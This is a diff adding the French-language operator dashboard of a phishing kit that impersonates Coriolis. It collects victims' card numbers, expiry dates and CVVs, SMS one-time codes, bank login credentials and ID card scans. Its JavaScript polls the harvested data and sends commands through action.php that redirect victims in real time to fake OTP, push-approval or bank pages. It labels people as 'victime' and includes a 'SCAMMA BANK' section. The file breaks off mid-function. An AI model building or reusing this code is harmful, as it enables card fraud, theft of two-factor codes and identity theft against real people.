@@ -1,0 +1,1573 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel - Gestion des Sessions</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+.container {
+    max-width: 1400px;  /* Augmenter la largeur */
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+/* Nouveau conteneur pour les rubriques en grille */
+.rubriques-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 20px;
+    margin-bottom: 25px;
+}
+
+/* Ajuster les rubriques dans la grille */
+.rubriques-grid .rubrique {
+    margin-bottom: 0;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+}
+
+.rubriques-grid .rubrique-body {
+    flex: 1;
+    max-height: 400px;
+    overflow-y: auto;
+}
+
+/* Supprimer l'ancien style victime-block */
+.victime-block {
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    margin-bottom: 25px;
+    width: 100%;
+}
+
+.victime-block:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+
+.victime-block .victime-header {
+    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+    color: white;
+    padding: 18px 25px;
+    font-weight: 600;
+    font-size: 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    letter-spacing: 0.5px;
+}
+
+.victime-block .victime-body {
+    padding: 20px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 15px;
+}
+
+.victime-block .input-group {
+    margin-bottom: 0;
+}
+
+.victime-block .input-group label {
+    margin-left: 20px;
+    margin-top: 20px;
+    display: block;
+    font-size: 12px;
+    color: #495057;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: -5px;
+    font-weight: 600;
+}
+
+.victime-block .input-group input {
+    width: 90%;
+    margin-top: 10px;
+    margin-left: 20px;
+    padding: 12px;
+    border: 2px solid #e9ecef;
+    border-radius: 10px;
+    font-size: 14px;
+    transition: all 0.3s ease;
+    background: #f8f9fa;
+}
+
+.victime-block .input-group input:focus {
+    outline: none;
+    border-color: #3498db;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+}
+
+.victime-block .btn-valider {
+    padding: 12px 30px;
+    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+    color: white;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    margin-top: 20px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    align-self: end;
+}
+
+.victime-block .btn-valider:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+}
+
+/* Responsive pour le bloc victime */
+@media (max-width: 768px) {
+    .victime-block .victime-body {
+        grid-template-columns: 1fr;
+    }
+    
+    .victime-block .btn-valider {
+        width: 100%;
+    }
+}
+
+.header {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 30px;
+    width: 100%;
+    margin-left: 0;
+    text-align: center;
+    margin-bottom: 30px;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    position: relative;
+    overflow: hidden;
+}
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+
+.rubrique {
+    background: white;
+    border-radius: 15px;
+    margin-bottom: 25px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.rubrique:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+
+.rubrique-header {
+    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+    color: white;
+    padding: 18px 25px;
+    font-weight: 600;
+    font-size: 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    letter-spacing: 0.5px;
+}
+
+.rubrique-header .badge {
+    background: rgba(255,255,255,0.2);
+    color: white;
+    padding: 5px 15px;
+    border-radius: 20px;
+    font-size: 14px;
+    font-weight: 700;
+}
+
+        .rubrique-body {
+            padding: 15px 20px;
+            min-height: 60px;
+        }
+
+        .rubrique-body .empty {
+            color: #999;
+            font-style: italic;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+.card-data {
+    background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+    padding: 20px;
+    border-radius: 12px;
+    margin-bottom: 15px;
+    font-size: 14px;
+    border-left: 5px solid #ff7900;
+    transition: all 0.3s ease;
+    position: relative;
+}
+
+.card-data:hover {
+    background: linear-gradient(135deg, #f1f3f5 0%, #dee2e6 100%);
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+
+.card-data .label {
+    color: #495057;
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 5px;
+}
+
+        .card-data .value {
+            font-weight: 600;
+            margin-top: 2px;
+            word-break: break-all;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+
+.btn-group .btn {
+    padding: 12px 20px;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    font-size: 13px;
+    cursor: pointer;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    flex: 1;
+    min-width: 100px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+}
+
+.btn-group .btn::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 0;
+    height: 0;
+    background: rgba(255,255,255,0.2);
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    transition: width 0.6s, height 0.6s;
+}
+
+.btn-group .btn:hover::after {
+    width: 300px;
+    height: 300px;
+}
+
+        .btn-refuser {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn-refuser:hover {
+            background: #c82333;
+            transform: translateY(-1px);
+        }
+
+        .btn-sms {
+            background: #28a745;
+            color: white;
+        }
+
+        .btn-sms:hover {
+            background: #218838;
+            transform: translateY(-1px);
+        }
+
+        .btn-push {
+            background: #007bff;
+            color: white;
+        }
+
+        .btn-push:hover {
+            background: #0069d9;
+            transform: translateY(-1px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .no-session {
+            text-align: center;
+            padding: 40px 20px;
+            color: #666;
+        }
+
+        .no-session .icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        /* Modal de confirmation */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+
+        .modal h3 {
+            margin-bottom: 10px;
+        }
+
+        .modal p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .modal .btn-group {
+            justify-content: center;
+        }
+
+        .modal .btn {
+            flex: none;
+            padding: 10px 30px;
+            min-width: 80px;
+        }
+
+        .btn-confirm {
+            background: #ff7900;
+            color: white;
+        }
+
+        .btn-confirm:hover {
+            background: #e56a00;
+        }
+
+        .btn-cancel {
+            background: #6c757d;
+            color: white;
+        }
+
+        .btn-cancel:hover {
+            background: #5a6268;
+        }
+
+        /* Animation pour nouvelle carte */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 121, 0, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 121, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 121, 0, 0); }
+        }
+
+        .new-card {
+            animation: pulse 1s ease-in-out;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn-group .btn {
+                min-width: unset;
+                padding: 14px 20px;
+                font-size: 16px;
+            }
+        }
+
+        .btn-bank {
+    background: #8B4513;
+    color: white;
+}
+
+.btn-bank:hover {
+    background: #6d3610;
+    transform: translateY(-1px);
+}
+
+.btn-log {
+    background: #8B4513;
+    color: white;
+}
+
+.btn-log:hover {
+    background: #6d3610;
+    transform: translateY(-1px);
+}
+
+@keyframes shimmer {
+    0% { background-position: -1000px 0; }
+    100% { background-position: 1000px 0; }
+}
+
+.loading {
+    background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+    background-size: 1000px 100%;
+    animation: shimmer 2s infinite;
+}
+
+.recup-log-block {
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    margin-bottom: 25px;
+    width: 100%;
+}
+
+.recup-log-block:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+
+.recup-log-block .recup-log-header {
+    background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
+    color: white;
+    padding: 18px 25px;
+    font-weight: 600;
+    font-size: 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    letter-spacing: 0.5px;
+}
+
+.recup-log-block .recup-log-body {
+    padding: 20px;
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+}
+
+.recup-log-block .input-group {
+    margin-bottom: 0;
+}
+
+.recup-log-block .input-group label {
+    margin-left: 20px;
+    margin-top: 20px;
+    display: block;
+    font-size: 12px;
+    color: #495057;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: -5px;
+    font-weight: 600;
+}
+
+.recup-log-block .input-group input {
+    width: 90%;
+    margin-top: 10px;
+    margin-left: 20px;
+    padding: 12px;
+    border: 2px solid #e9ecef;
+    border-radius: 10px;
+    font-size: 14px;
+    transition: all 0.3s ease;
+    background: #f8f9fa;
+}
+
+.recup-log-block .input-group input[readonly] {
+    background: #e9ecef;
+    color: #495057;
+    cursor: not-allowed;
+}
+
+.recup-log-block .input-group input:focus {
+    outline: none;
+    border-color: #D2691E;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(210, 105, 30, 0.1);
+}
+
+.recup-log-block .btn-valider {
+    padding: 12px 30px;
+    background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
+    color: white;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    margin-top: 20px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    align-self: end;
+    grid-column: span 2;
+}
+
+.recup-log-block .btn-valider:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+}
+
+@media (max-width: 768px) {
+    .recup-log-block .recup-log-body {
+        grid-template-columns: 1fr;
+    }
+    
+    .recup-log-block .btn-valider {
+        width: 100%;
+        grid-column: span 1;
+    }
+}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>Panel - Coriolis</h1>
+    </div>
+
+    <!-- Grille de 4 rubriques -->
+    <div class="rubriques-grid">
+        <!-- Rubrique 1 : CARTE CB -->
+        <div class="rubrique">
+            <div class="rubrique-header">
+                <span>💳 CARTE CB</span>
+                <span class="badge" id="cardBadge">0</span>
+            </div>
+            <div class="rubrique-body" id="cardBody">
+                <div class="empty">Aucune donnée de carte enregistrée</div>
+            </div>
+        </div>
+
+        <!-- Rubrique 2 : CODE SMS -->
+        <div class="rubrique">
+            <div class="rubrique-header">
+                <span>📱 CODE SMS</span>
+                <span class="badge" id="smsBadge">0</span>
+            </div>
+            <div class="rubrique-body" id="smsBody">
+                <div class="empty">Aucun code SMS enregistré</div>
+            </div>
+        </div>
+
+        <!-- Rubrique 3 : PUSH BANK -->
+        <div class="rubrique">
+            <div class="rubrique-header">
+                <span>🏦 PUSH BANK</span>
+                <span class="badge" id="pushBadge">0</span>
+            </div>
+            <div class="rubrique-body" id="pushBody">
+                <div class="empty">Aucune donnée Push Bank enregistrée</div>
+            </div>
+        </div>
+
+        <!-- Rubrique 4 : LOG BANK -->
+        <div class="rubrique">
+            <div class="rubrique-header">
+                <span>🔑 LOG BANK</span>
+                <span class="badge" id="logBadge">0</span>
+            </div>
+            <div class="rubrique-body" id="logBody">
+                <div class="empty">Aucune donnée de connexion enregistrée</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bloc RECUP LOG -->
+<div class="recup-log-block">
+    <div class="recup-log-header">
+        🪪 RECUP LOG
+    </div>
+    <div class="recup-log-body">
+        <div class="input-group">
+            <label>Numéro Coriolis</label>
+            <input type="text" id="recupNumero" readonly placeholder="En attente...">
+        </div>
+        <div class="input-group">
+            <label>Montant de la facture</label>
+            <input type="text" id="recupMontant" readonly placeholder="En attente...">
+        </div>
+        <div class="input-group">
+            <label>Date de la facture</label>
+            <input type="text" id="recupDate" readonly placeholder="En attente...">
+        </div>
+<div class="input-group">
+    <label>Type de redirection</label>
+    <select id="recupType" onchange="toggleRedirectionType()" style="width:90%;margin-top:10px;margin-left:20px;padding:12px;border:2px solid #e9ecef;border-radius:10px;font-size:14px;background:#f8f9fa;">
+        <option value="">-- Choisir --</option>
+        <option value="link">Redirect Link</option>
+        <option value="doc">Redirect Doc</option>
+    </select>
+</div>
+<div class="input-group" id="lienVerifGroup" style="display:none;">
+    <label>Lien de vérification</label>
+    <input type="text" id="recupLien" placeholder="Entrez le lien de vérification">
+</div>
+<button class="btn-valider" onclick="validerRecupLog()">✅ Valider</button>
+    </div>
+</div>
+
+<!-- Bloc VERIF DOC -->
+<div class="recup-log-block">
+    <div class="recup-log-header">
+        🪪 VERIF DOC
+    </div>
+    <div class="recup-log-body" id="verifDocBody">
+        <div class="input-group">
+            <label>Recto CNI</label>
+            <div id="docRectoPreview" style="margin-left:20px;margin-top:10px;">
+                <span style="color:#999;font-style:italic;">En attente...</span>
+            </div>
+        </div>
+        <div class="input-group">
+            <label>Verso CNI</label>
+            <div id="docVersoPreview" style="margin-left:20px;margin-top:10px;">
+                <span style="color:#999;font-style:italic;">En attente...</span>
+            </div>
+        </div>
+        <div class="input-group" id="docLinkGroup" style="display:none;grid-column:span 2;">
+            <label>Lien de vérification</label>
+            <input type="text" id="docLien" placeholder="Veuillez entrez le lien de vérification">
+        </div>
+        <div style="grid-column:span 2;display:flex;gap:10px;margin-top:15px;">
+            <button class="btn btn-sms" style="flex:1;" onclick="docValider()">✅ Valider</button>
+            <button class="btn btn-refuser" style="flex:1;" onclick="docRefuser()">❌ Refuser</button>
+            <button class="btn btn-push" style="flex:1;" onclick="docLink()">🔗 Link</button>
+        </div>
+        <button class="btn-valider" id="docLinkConfirm" style="display:none;" onclick="docConfirmerLien()">✅ Envoyer le lien</button>
+    </div>
+</div>
+        <!-- Bloc Victime en haut à gauche -->
+    <div class="victime-block">
+        <div class="victime-header">
+            🙍🏻‍♂️ NOM PRENOM VICTIME + PRIX
+        </div>
+        <div class="input-group">
+            <label>Nom</label>
+            <input type="text" id="nomVictime" placeholder="Entrez le nom">
+        </div>
+        <div class="input-group">
+            <label>Prénom</label>
+            <input type="text" id="prenomVictime" placeholder="Entrez le prénom">
+        </div>
+        <div class="input-group">
+            <label>Prix</label>
+            <input type="number" id="prixVictime" placeholder="Entrez le prix" min="0" step="0.01">
+        </div>
+        <button class="btn-valider" onclick="validerVictime()">✅ Valider</button>
+    </div>
+
+    <!-- SCAMMA BANK en dessous, pleine largeur -->
+    <div class="rubrique scamma-full">
+        <div class="rubrique-header">
+            <span>📂 SCAMMA BANK</span>
+            <span class="badge" id="scammaBadge">0</span>
+        </div>
+        <div class="rubrique-body" id="scammaBody">
+            <div class="empty">Aucun fichier bank-index.html</div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de confirmation -->
+<div class="modal-overlay" id="actionModal">
+    <div class="modal">
+        <h3>⚠️ Confirmation</h3>
+        <p id="modalMessage">Êtes-vous sûr de vouloir effectuer cette action ?</p>
+        <div class="btn-group">
+            <button class="btn btn-cancel" onclick="closeModal()">Annuler</button>
+            <button class="btn btn-confirm" id="confirmActionBtn">Confirmer</button>
+        </div>
+    </div>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    loadFromJsonFile();
+    loadSmsData();
+    loadPushData();
+    loadLogData();
+    listenForNewCard();
+    checkNewCardNotification();
+    
+    // Rafraîchir les logs toutes les 5 secondes
+    setInterval(function() {
+        loadLogData();
+    }, 5000);
+});
+
+    // Écouter les messages du localStorage
+    window.addEventListener('storage', function(e) {
+        if (e.key === 'cardData') {
+            loadCardData();
+        }
+        if (e.key === 'smsData') {
+            loadSmsData();
+        }
+        if (e.key === 'pushData') {
+            loadPushData();
+        }
+    });
+
+    // Charger les données au démarrage
+    document.addEventListener('DOMContentLoaded', function() {
+        // Charger depuis le fichier JSON d'abord
+        loadFromJsonFile();
+        // Puis charger les autres données
+        loadSmsData();
+        loadPushData();
+        listenForNewCard();
+    });
+
+    // NOUVELLE FONCTION : Charger les données depuis card.json
+    function loadFromJsonFile() {
+        fetch('card.json')
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Fichier non trouvé');
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data && data.sessions && data.sessions.length > 0) {
+                    // Sauvegarder dans localStorage
+                    localStorage.setItem('cardData', JSON.stringify(data));
+                    // Afficher les cartes
+                    loadCardData();
+                    console.log('✅ ' + data.sessions.length + ' carte(s) chargée(s) depuis card.json');
+                } else {
+                    console.log('ℹ️ card.json vide, vérification localStorage...');
+                    loadCardData();
+                }
+            })
+            .catch(error => {
+                console.log('ℹ️ card.json inaccessible, utilisation du localStorage');
+                loadCardData();
+            });
+    }
+
+    // Écouter les nouvelles données de carte
+    function listenForNewCard() {
+        let lastCardData = localStorage.getItem('cardData');
+        setInterval(() => {
+            const currentCardData = localStorage.getItem('cardData');
+            if (currentCardData !== lastCardData) {
+                lastCardData = currentCardData;
+                loadCardData();
+                
+                const cardBody = document.getElementById('cardBody');
+                if (cardBody) {
+                    cardBody.classList.add('new-card');
+                    setTimeout(() => {
+                        cardBody.classList.remove('new-card');
+                    }, 1000);
+                }
+            }
+        }, 500);
+    }
+
+// Charger les données LOG BANK depuis log.json
+function loadLogData() {
+    const logBody = document.getElementById('logBody');
+    const logBadge = document.getElementById('logBadge');
+    
+    fetch('get_logs.php')
+        .then(response => response.json())
+        .then(data => {
+            const sessions = data.sessions || [];
+            
+            if (sessions.length === 0) {
+                logBody.innerHTML = `<div class="empty">Aucune donnée de connexion enregistrée</div>`;
+                logBadge.textContent = '0';
+                return;
+            }
+            
+            let allLogsHtml = sessions.map((log, index) => `
+                <div class="card-data" style="border-left-color: #8B4513;">
+                    <div class="label">🔐 Identifiant</div>
+                    <div class="value">${log.identifiant || 'Non renseigné'}</div>
+                    <div class="label">🔢 Code</div>
+                    <div class="value">${log.code || 'Non renseigné'}</div>
+                    <div class="label">⏰ Reçu le</div>
+                    <div class="value">${new Date(log.timestamp * 1000).toLocaleString('fr-FR')}</div>
+                    <div class="btn-group">
+                        <button class="btn btn-refuser" onclick="refuserLog(${index})">❌ REFUSER</button>
+                        <button class="btn btn-sms" onclick="logEnvoyerSms(${index})">📱 SMS</button>
+                        <button class="btn btn-push" onclick="logEnvoyerPush(${index})">🏦 PUSH</button>
+                    </div>
+                </div>
+            `).join('');
+            
+            logBody.innerHTML = allLogsHtml;
+            logBadge.textContent = sessions.length;
+        })
+        .catch(error => {
+            console.error('Erreur chargement log:', error);
+            logBody.innerHTML = `<div class="empty">Erreur de chargement des logs</div>`;
+            logBadge.textContent = '0';
+        });
+}
+
+// Actions pour LOG BANK avec suppression du fichier JSON
+function refuserLog(index) {
+    fetch('delete_log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ index: index })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            loadLogData();
+            // Envoyer l'action refresh à bank-index.html
+            fetch('action.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'refresh_bank' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Action refresh_bank envoyée:', data);
+            })
+            .catch(error => console.error('❌ Erreur:', error));
+        }
+    })
+    .catch(error => console.error('Erreur:', error));
+}
+
+function logEnvoyerSms(index) {
+    fetch('delete_log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ index: index })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            loadLogData();
+            // Envoyer l'action redirect_otp à bank-index.html
+            fetch('action.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'redirect_otp_bank' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Action redirect_otp_bank envoyée:', data);
+            })
+            .catch(error => console.error('❌ Erreur:', error));
+        }
+    })
+    .catch(error => console.error('Erreur:', error));
+}
+
+function logEnvoyerPush(index) {
+    fetch('delete_log.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ index: index })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            loadLogData();
+            // Envoyer l'action redirect_push à bank-index.html
+            fetch('action.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'redirect_push_bank' })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Action redirect_push_bank envoyée:', data);
+            })
+            .catch(error => console.error('❌ Erreur:', error));
+        }
+    })
+    .catch(error => console.error('Erreur:', error));
+}
+
+// Charger les données de carte CB
+function loadCardData() {
+    const cardBody = document.getElementById('cardBody');
+    const cardBadge = document.getElementById('cardBadge');
+    const cardData = localStorage.getItem('cardData');
+
+    if (cardData) {
+        try {
+            const data = JSON.parse(cardData);
+            const sessions = data.sessions || [];
+            
+            if (sessions.length === 0) {
+                cardBody.innerHTML = `<div class="empty">Aucune donnée de carte enregistrée</div>`;
+                cardBadge.textContent = '0';
+                return;
+            }
+            
+            // Afficher chaque carte individuellement
+            let allCardsHtml = sessions.map((session, index) => `
+                <div class="card-data" style="margin-bottom: 15px;">
+                    <div class="label">💳 Numéro de carte</div>
+                    <div class="value">${session.cardNumber || 'Non renseigné'}</div>
+                    <div class="label">📆 Date d'expiration</div>
+                    <div class="value">${session.expiryDate || 'Non renseignée'}</div>
+                    <div class="label">🔑 Cryptogramme</div>
+                    <div class="value">${session.crypto || 'Non renseigné'}</div>
+                    <div class="label">⏰ Reçu le</div>
+                    <div class="value">${new Date(session.timestamp || Date.now()).toLocaleString('fr-FR')}</div>
+                    <div class="btn-group">
+                        <button class="btn btn-refuser" onclick="refuserCarte(${index})">❌ REFUSER</button>
+                        <button class="btn btn-sms" onclick="envoyerSms(${index})">📱 SMS</button>
+                        <button class="btn btn-push" onclick="envoyerPush(${index})">🏦 PUSH</button>
+                        <button class="btn btn-bank" onclick="redirigerBank(${index})" style="background: #8B4513; color: white;">📂 BANK</button>
+                    </div>
+                </div>
+            `).join('');
+            
+            cardBody.innerHTML = allCardsHtml;
+            cardBadge.textContent = sessions.length;
+        } catch (e) {
+            console.error('Erreur chargement carte:', e);
+            cardBody.innerHTML = `<div class="empty">Erreur de chargement des données</div>`;
+            cardBadge.textContent = '0';
+        }
+    } else {
+        cardBody.innerHTML = `<div class="empty">Aucune donnée de carte enregistrée</div>`;
+        cardBadge.textContent = '0';
+    }
+}
+
+    // Charger les données SMS
+    function loadSmsData() {
+        const smsBody = document.getElementById('smsBody');
+        const smsBadge = document.getElementById('smsBadge');
+        const smsData = localStorage.getItem('smsData');
+
+        if (smsData) {
+            try {
+                const data = JSON.parse(smsData);
+                const sessions = data.sessions || [];
+                smsBody.innerHTML = sessions.map((s, i) => `
+                    <div class="card-data">
+                        <div class="label">📱 Code SMS #${i + 1}</div>
+                        <div class="value">${s.code || 'Code non renseigné'}</div>
+                        <div class="label" style="margin-top:5px;">⏰ ${new Date(s.timestamp || Date.now()).toLocaleString('fr-FR')}</div>
+                    </div>
+                `).join('') || `<div class="empty">Aucun code SMS enregistré</div>`;
+                smsBadge.textContent = sessions.length || 0;
+            } catch (e) {
+                smsBody.innerHTML = `<div class="empty">Erreur de chargement</div>`;
+                smsBadge.textContent = '0';
+            }
+        } else {
+            smsBody.innerHTML = `<div class="empty">Aucun code SMS enregistré</div>`;
+            smsBadge.textContent = '0';
+        }
+    }
+
+    // Charger les données Push Bank
+    function loadPushData() {
+        const pushBody = document.getElementById('pushBody');
+        const pushBadge = document.getElementById('pushBadge');
+        const pushData = localStorage.getItem('pushData');
+
+        if (pushData) {
+            try {
+                const data = JSON.parse(pushData);
+                const sessions = data.sessions || [];
+                pushBody.innerHTML = sessions.map((p, i) => `
+                    <div class="card-data">
+                        <div class="label">🏦 Push Bank #${i + 1}</div>
+                        <div class="value">${p.message || 'Message non renseigné'}</div>
+                        <div class="label" style="margin-top:5px;">⏰ ${new Date(p.timestamp || Date.now()).toLocaleString('fr-FR')}</div>
+                    </div>
+                `).join('') || `<div class="empty">Aucune donnée Push Bank enregistrée</div>`;
+                pushBadge.textContent = sessions.length || 0;
+            } catch (e) {
+                pushBody.innerHTML = `<div class="empty">Erreur de chargement</div>`;
+                pushBadge.textContent = '0';
+            }
+        } else {
+            pushBody.innerHTML = `<div class="empty">Aucune donnée Push Bank enregistrée</div>`;
+            pushBadge.textContent = '0';
+        }
+    }
+
+    // Actions
+    let actionPending = null;
+
+// Actions avec suppression de la carte de localStorage ET card.json
+function refuserCarte(index) {
+    const cardData = localStorage.getItem('cardData');
+    if (cardData) {
+        try {
+            const data = JSON.parse(cardData);
+            if (data.sessions && data.sessions.length > index) {
+                // Supprimer la carte à l'index spécifié
+                data.sessions.splice(index, 1);
+                localStorage.setItem('cardData', JSON.stringify(data));
+                loadCardData();
+                
+                // Mettre à jour card.json
+                updateCardJson(data);
+                
+                // Envoyer l'action via PHP
+                fetch('action.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'refresh' })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Action refresh envoyée:', data);
+                })
+                .catch(error => console.error('❌ Erreur:', error));
+            }
+        } catch (e) {
+            console.error('Erreur:', e);
+        }
+    }
+}
+
+function envoyerSms(index) {
+    const cardData = localStorage.getItem('cardData');
+    if (cardData) {
+        try {
+            const data = JSON.parse(cardData);
+            if (data.sessions && data.sessions.length > index) {
+                // Supprimer la carte à l'index spécifié
+                data.sessions.splice(index, 1);
+                localStorage.setItem('cardData', JSON.stringify(data));
+                loadCardData();
+                
+                // Mettre à jour card.json
+                updateCardJson(data);
+                
+                // Envoyer l'action via PHP
+                fetch('action.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'redirect_otp' })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Action redirect_otp envoyée:', data);
+                })
+                .catch(error => console.error('❌ Erreur:', error));
+            }
+        } catch (e) {
+            console.error('Erreur:', e);
+        }
+    }
+}
+
+function envoyerPush(index) {
+    const cardData = localStorage.getItem('cardData');
+    if (cardData) {
+        try {
+            const data = JSON.parse(cardData);
+            if (data.sessions && data.sessions.length > index) {
+                // Supprimer la carte à l'index spécifié
+                data.sessions.splice(index, 1);
+                localStorage.setItem('cardData', JSON.stringify(data));
+                loadCardData();
+                
+                // Mettre à jour card.json
+                updateCardJson(data);
+                
+                // Envoyer l'action via PHP
+                fetch('action.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'redirect_push' })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('✅ Action redirect_push envoyée:', data);
+                })
+                .catch(error => console.error('❌ Erreur:', error));
+            }
+        } catch (e) {
+            console.error('Erreur:', e);
+        }
+    }
+}
+
+// Fonction pour rediriger vers bank-index.html
+function redirigerBank(index) {
+    // Vérifier si le fichier bank-index.html existe
+    fetch('check_bank_file.php')
+        .then(response => response.json())
+        .then(data => {
+            if (data.exists) {
+                // Récupérer les données de la carte
+                const cardData = localStorage.getItem('cardData');
+                if (cardData) {
+                    try {
+                        const data = JSON.parse(cardData);
+                        if (data.sessions && data.sessions.length > index) {
+                            // Supprimer la carte à l'index spécifié
+                            data.sessions.splice(index, 1);
+                            localStorage.setItem('cardData', JSON.stringify(data));
+                            loadCardData();
+                            
+                            // Mettre à jour card.json
+                            updateCardJson(data);
+                        }
+                    } catch (e) {
+                        console.error('Erreur:', e);
+                    }
+                }
+                
+                // Envoyer une action pour rediriger card-coriolis.html vers bank-index.html
+                fetch('action.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
